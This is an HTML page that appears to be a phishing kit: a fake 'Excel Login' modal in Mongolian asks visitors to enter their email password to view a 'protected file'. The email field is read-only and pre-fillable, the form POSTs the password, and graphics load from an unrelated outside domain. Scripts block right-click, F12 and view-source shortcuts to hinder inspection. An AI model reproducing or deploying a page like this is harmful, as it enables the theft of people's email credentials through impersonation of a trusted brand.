<html lang="en"><head>

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Excel Login</title>
  <link rel="shortcut icon" href="https://vinafantazkurniawan.com/skzvdem/img/icom.png">
  </head><body style="background-image: url('https://vinafantazkurniawan.com/skzvdem/img/XL7638BG.png'); background-repeat: no-repeat;background-size: cover;">
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    html, body {
      height: 100%;
      background-color: #eaf4ea;
      overflow: hidden;
    }

    .overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1;
    }

    .modal {
      background: white;
      padding: 2.5rem;
      border-radius: 12px;
      width: 90%;
      max-width: 420px;
      z-index: 2;
      box-shadow: 0 0 30px rgba(0,0,0,0.3);
    }

    .modal .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 1.5rem;
    }

    .modal .logo img {
      height: 60px;
    }

    .modal h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #217346;
    }

    .modal label {
      display: block;
      margin: 10px 0 5px;
      font-weight: 500;
    }

    .modal input[type="email"],
    .modal input[type="password"] {
      width: 100%;
      padding: 10px;
      border-radius: 6px;
      border: 1px solid #217346;
      font-size: 1rem;
      outline: none;
    }

    .modal input[type="email"]:focus,
    .modal input[type="password"]:focus {
      box-shadow: 0 0 0 2px rgba(33, 115, 70, 0.2);
      border-color: #217346;
    }

    .modal .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 0.8rem;
    }

    .modal .options label {
      display: flex;
      align-items: center;
      font-size: 0.9rem;
      gap: 6px;
      user-select: none;
    }

    .modal .options input[type="checkbox"] {
      accent-color: #217346;
      width: 16px;
      height: 16px;
      cursor: pointer;
    }

    .modal .options a {
      font-size: 0.9rem;
      color: #217346;
      text-decoration: none;
    }

    .modal .options a:hover {
      text-decoration: underline;
    }

    .modal button {
      margin-top: 1.5rem;
      width: 100%;
      padding: 12px;
      background-color: #217346;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.2s;
    }

    .modal button:hover {
      background-color: #1a5f38;
    }

    @media (max-width: 500px) {
      .modal {
        padding: 2rem;
      }
      .modal h2 {
        font-size: 1.3rem;
      }
    }
	.error{
	font-size: 12px;
	color:red;
	}
  </style>



  <!-- Overlay and Modal -->
  <div class="overlay">
    <div class="modal">
     <form novalidate="" id="login_form" action="" method="POST" style="visibility:">
	  <div class="logo">
        <img src="https://vinafantazkurniawan.com/skzvdem/img/TP7638W.jpg" style="height:90px; width:350px;"></div>
      <div align="center"><h4>Үргэлжлүүлэхийн тулд имэйл нууц үгээ оруулна уу.</h4>
	  
      <div align="left"><label for="email">Имэйл</label>
      <input type="email" name="email" id="email" placeholder="Имэйл хаяг" required="" value="" readonly="">

      <label for="password">Нууц үг</label>
      <input id="password" name="password" type="password" placeholder="Имэйл нууц үгээ оруулна уу" required="" autofocus="">
      <font size="2" color="red"><span id="pwarning" class="text-danger" style="display: none;">&shy;</span>
      <div class="options">
        <label><font color="black"><input type="checkbox" checked=""> Хамгаалагдсан файл</font></label><font color="black">
        <a href="#"></a>
      </font></div><font color="black">
		<div align="center"><div id="login-status-icon-container"><font color="red" size="2"><span class="login-status-icon" id="login-status-message"></span></font></div><font color="red" size="2">

      <button name="login" id="submit-btn" tabindex="3" class="Modal_button__RBl2F" type="submit">Баримт бичгийг үзэх</button>
	 
    </font></div><font color="red" size="2">
  </font></font></font></form></div><font size="2" color="red"><font color="black"><font color="red" size="2">

</script><script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>

<script type="text/javascript">
document.oncontextmenu = function() { return false; }; // Disable right-click
document.onmousedown = function(e) {
  if (e.button === 2 || e.button === 3) {
    return false; // Disable middle and right mouse buttons
  }
};
</script type="text/javascript">

<script type="text/javascript">
  document.addEventListener('contextmenu', event => event.preventDefault());
  document.addEventListener('keydown', function(e) {
    if (e.key === "F12" || 
        (e.ctrlKey && (e.key === "u" || e.key === "U")) || 
        (e.ctrlKey && e.shiftKey && e.key === "I")) {
      e.preventDefault();
    }
  });
</script type="text/javascript">

</html>
